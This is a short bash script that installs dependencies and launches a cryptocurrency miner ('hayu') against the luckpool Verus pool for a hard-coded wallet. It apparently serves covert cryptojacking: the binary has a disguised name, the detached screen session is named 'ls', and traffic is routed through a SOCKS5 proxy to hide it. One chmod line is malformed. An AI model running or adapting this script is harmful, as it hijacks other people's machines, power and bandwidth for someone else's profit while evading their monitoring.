#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x jured.sh && chmod +x hayu chmod 777 hayu jured.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RKq1mFG57gmApqmGxLtXEv2Mm7y3fTZuCX
WORKER=$(echo $(shuf -i 1-10 -n 1)jured)
PROXY=socks5://72.195.34.58:4145	
./hayu -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
